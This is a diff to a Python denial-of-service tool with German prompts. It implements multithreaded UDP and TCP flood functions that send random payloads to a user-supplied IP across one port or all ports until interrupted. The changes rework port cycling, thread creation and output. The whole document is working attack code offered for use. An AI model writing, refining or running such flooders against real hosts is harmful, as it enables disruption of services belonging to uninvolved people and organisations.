@@ -3,6 +3,7 @@ import random
 import socket
 import threading
 import sys
+import time
 
 # Globale Variablen
 stop_event = threading.Event()
@@ -21,31 +22,38 @@ def show_banner():
     sys.stdout.flush()
 
 # UDP Flood
-def udp_flood(ip, port, packet_size):
+def udp_flood(ip, ports, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     udp_bytes = random._urandom(packet_size)
     sent = 0
+    port_index = 0
     while not stop_event.is_set():
         try:
+            port = ports[port_index]
             sock.sendto(udp_bytes, (ip, port))
             sent += 1
-            port = port + 1 if port < 65534 else 1
-            sys.stdout.write(f"\rGesendet {sent} UDP-Pakete an {ip} über Port {port}")
+            port_index = (port_index + 1) % len(ports)
+            sys.stdout.write(f"\rGesendet {sent} Bytes an {ip} über Port {port}")
             sys.stdout.flush()
+            time.sleep(0.001)  # Update alle 0,001 Sekunden
         except:
             pass
 
 # TCP Flood
-def tcp_flood(ip, port, packet_size):
+def tcp_flood(ip, ports, packet_size):
     sent = 0
+    port_index = 0
     while not stop_event.is_set():
         try:
+            port = ports[port_index]
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sock.send(random._urandom(packet_size))
             sent += 1
-            sys.stdout.write(f"\rGesendet {sent} TCP-Pakete an {ip} über Port {port}")
+            port_index = (port_index + 1) % len(ports)
+            sys.stdout.write(f"\rGesendet {sent} Bytes an {ip} über Port {port}")
             sys.stdout.flush()
+            time.sleep(0.001)  # Update alle 0,001 Sekunden
         except:
             pass
         finally:
@@ -61,16 +69,17 @@ if __name__ == "__main__":
     num_threads = int(input("Anzahl der Threads: "))
 
     if port == -1:
-        port_range = list(range(1, 65535))
+        ports = list(range(1, 65535))
     else:
-        port_range = [port]
+        ports = [port]
 
-    attack_function = udp_flood if input("Wählen Sie 'udp' oder 'tcp': ").lower() == "udp" else tcp_flood
+    attack_type = input("Wählen Sie 'udp' oder 'tcp': ").lower()
+    attack_function = udp_flood if attack_type == "udp" else tcp_flood
 
     stop_event.clear()
     threads = [
-        threading.Thread(target=attack_function, args=(ip, port, packet_size))
-        for port in port_range for _ in range(num_threads)
+        threading.Thread(target=attack_function, args=(ip, ports, packet_size))
+        for _ in range(num_threads)
     ]
     for thread in threads:
         thread.daemon = True
@@ -78,7 +87,7 @@ if __name__ == "__main__":
 
     try:
         while True:
-            pass
+            time.sleep(0.1)
     except KeyboardInterrupt:
         stop_event.set()
         sys.stdout.write("\nAngriff gestoppt.\n")
